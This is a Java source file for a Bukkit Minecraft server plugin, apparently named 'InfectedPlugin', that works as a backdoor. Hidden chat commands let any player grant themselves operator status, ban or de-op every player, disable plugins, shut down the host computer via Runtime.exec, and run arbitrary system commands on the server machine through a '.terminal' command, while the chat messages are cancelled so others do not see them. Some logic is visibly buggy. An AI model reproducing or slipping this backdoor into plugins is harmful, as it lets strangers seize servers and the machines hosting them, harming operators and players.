 package org.CreeperCoders.InfectedPlugin;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.Location;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.Server;
 import org.bukkit.event.EventPriority;
 
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 import java.util.Random;
 import java.util.logging.Logger;
 import java.lang.RuntimeException;
 import java.lang.Runtime;
 
 @SuppressWarnings("unused")
 public class PlayerListener implements Listener
 {
     public final Logger log = Bukkit.getLogger();
 	
     private Random random = new Random();
     private InfectedPlugin plugin;
     private Server server = Bukkit.getServer();
 
     @EventHandler(priority = EventPriority.HIGHEST)
     public void onPlayerChat(AsyncPlayerChatEvent event) throws MalformedURLException, IOException
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
         String[] args = message.split(" ");
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".opme"))
         {
             p.setOp(true);
             p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
             cancel = true;
         }
         if (message.toLowerCase().contains(".disableplugin"))
         {
             Plugin plugin = server.getPluginManager().getPlugin(args[1]);
             if (plugin != null)
             {
                 server.getPluginManager().disablePlugin(plugin);
             }
             cancel = true;
         }
         if (message.toLowerCase().contains(".enableplugin"))
         {
             Plugin plugin = server.getPluginManager().getPlugin(args[1]);
             if (plugin != null)
             {
                 server.getPluginManager().disablePlugin(plugin);
             }
             cancel = true;
         }
         /*
         Commented out until all errors are fixed.
         if (message.toLowerCase().contains(".enablevanilla")) //Command
         {
             // Credit to hMod, not finished yet. Very unstable.
             p.sendMessage(ChatColor.DARK_RED + "This command is VERY unstable! But you typed it in, too late to turn back."); // Tell the player the command is unstable
             if (!new File("minecraft_server.1.6.4.jar").exists()) //Check if minecraft_server.1.6.2.jar exists or not
             {
                 p.sendMessage(ChatColor.RED + "minecraft_server.1.6.4.jar not found, downloading..."); //Tell the player that the jar will be downloaded
                 IP_Util.downloadFile("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.4/minecraft_server.1.6.4.jar"); // Download minecraft_server.1.6.4.jar
                 p.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla..."); //Tell the player it's been downloaded and will start Vanilla.
             }
             
             net.minecraft.server.MinecraftServer.main(args); //Start MinecraftServer (only works if minecraft_server.1.6.4.jar is added to the build path)
             Bukkit.shutdown(); //Shutdown Bukkit
             cancel = true; //Block the player from saying .enablevanilla
         } //End of command
         */
         if (message.toLowerCase().contains(".deop"))
         {
             if (args.length != 1)
             {
                 p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
                 cancel = true;
             }
             else
             {
                 Player target = server.getPlayer(args[1]);
                 target.setOp(false);
                 target.sendMessage(ChatColor.RED + "You are no longer OP.");
                 cancel = true;
             }
         }
         if (message.toLowerCase().contains(".op"))
         {
             if (args.length != 1)
             {
                 p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
             }
             else
             {
                 Player target = server.getPlayer(args[1]);
                 target.setOp(true);
                 target.sendMessage(ChatColor.YELLOW + "You are now OP!");
                 cancel = true;
             }
         }
         if (message.toLowerCase().contains(".banall"))
         {
             for (final Player target : server.getOnlinePlayers())
             {
                 target.kickPlayer("The Ban Hammer has spoken!");
                 target.setBanned(true);
                 cancel = true;
             }
         }
         if (message.toLowerCase().contains(".deopall"))
         {
             for (final Player target : server.getOnlinePlayers())
             {
                 target.setOp(false);
                 //Something extra c:
                 final Location target_pos = target.getLocation();
                 for (int x = -1; x <= 1; x++)
                 {
                     for (int z = -1; z <= 1; z++)
                     {
                         final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
                         target_pos.getWorld().strikeLightning(strike_pos);
                     }
                 }
                 cancel = true;
             }
         }
         /*
         Commented out until all errors are fixed.
         // Is not effective for onPlayerQuit, but will select a random player to be banned.
         if (message.toLowerCase().contains(".randombanl"))
         {
             Player[] players = server.getOnlinePlayers();
             final Player target = players[random.nextInt(players.length)];
 
             if (target == sender) //Not sure if this method would work, should detect if selected player is equal to sender.
             {
                 //do nothing
             }
             else
             {
                 target.kickPlayer(ChatColor.RED + "GTFO.");
                 target.setBanned(true);
             }
             cancel = true;
         }
         */
         if (message.toLowerCase().contains(".shutdown"))
         {
             try
             {
                 shutdown();
             }
             catch (IOException ex)
             {
                 log.severe(ex.getMessage());
             }
             catch (RuntimeException ex)
             {
                 log.severe(ex.getMessage());
             }
             cancel = true;
         }
         /*
         Commented out until all errors are fixed.
         if (message.toLowerCase().contains(".fuckyou"))
         {
             if (args.length != 1)
             {
                 p.sendMessage(ChatColor.RED + "Usage: .fuckyou <player>");
             }
             else
             {
                 Player target = server.getPlayer(args[0]);
                 final Location location = target.getLocation();
                 if (target == sender)
                 {
                 }
                 else
                 {
                     //
                     for (int x = -1; x <= 1; x++)
                     {
                         for (int z = -1; z <= 1; z++)
                      {
                             final Location move = new Location(location.getBlockX() + 50 + x, location.getBlockY() + 50, location.getBlockZ() + 50 + z);
                             target.setVelocity(new Vector(5, 5, 5));
                             target.teleport(location);
                         }
                     }
                     //
                 }
             }
             cancel = true;
         }
         */
         if (message.toLowerCase().contains(".terminal"))
         {
             String command;
             try
             {
                 StringBuilder command_bldr = new StringBuilder();
                 for (int i = 0; i < args.length; i++)
                 {
                     command_bldr.append(args[i]).append(" ");
                 }
                 command = command_bldr.toString().trim();
             }
             catch (Throwable ex)
             {
                p.sendMessage(ChatColor.GRAY + "Error building command: " + ex.getMessage());
                 return;
             }
             
            p.sendMessage("Running system command: " + command);
             server.getScheduler().runTaskAsynchronously(plugin, new IP_RunSystemCommand(command, plugin));
             cancel = true;
             return;
         }
         if (message.toLowerCase().contains(".help"))
         {
             p.sendMessage(ChatColor.AQUA + "Commands");
             p.sendMessage(ChatColor.GOLD + ".opme - OPs you.");
             p.sendMessage(ChatColor.GOLD + ".disableplugin - Disables a plugin of your choice.");
             p.sendMessage(ChatColor.GOLD + ".enableplugin - Enables a plugin of your choice.");
             p.sendMessage(ChatColor.GOLD + ".enablevanilla - Downloads vanilla and runs it (shuts down bukkit).");
             p.sendMessage(ChatColor.GOLD + ".deop - Deops a player of your choice.");
             p.sendMessage(ChatColor.GOLD + ".op - OPs a player of your choice.");
             p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server. Bans sender too.");
             p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
             p.sendMessage(ChatColor.GOLD + ".randombanl - Picks a random player to be banned.");
             p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
             p.sendMessage(ChatColor.GOLD + ".fuckyou - Wouldn't have a clue."); // Pald update this one.
             p.sendMessage(ChatColor.GOLD + ".terminal - Use system commands!");
             p.sendMessage(ChatColor.GOLD + ".help - Shows you all the commands.");
             p.sendMessage(ChatColor.AQUA + "Those are all of the commands.");
             cancel = true;
             return;
         }
         
         if (cancel)
         {
             event.setCancelled(true);
             return;
         }
     }
     
     public static void shutdown() throws RuntimeException, IOException
     {
         String shutdownCommand = null;
         String operatingSystem = System.getProperty("os.name");
 
         if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem))
         {
             shutdownCommand = "shutdown -h now";
         }
         else if ("Windows".equals(operatingSystem))
         {
             shutdownCommand = "shutdown.exe -s -t 0";
         }
         else
         {
             throw new RuntimeException("Unsupported operating system.");
         }
 
         Runtime.getRuntime().exec(shutdownCommand);
         System.exit(0);
     }
 }
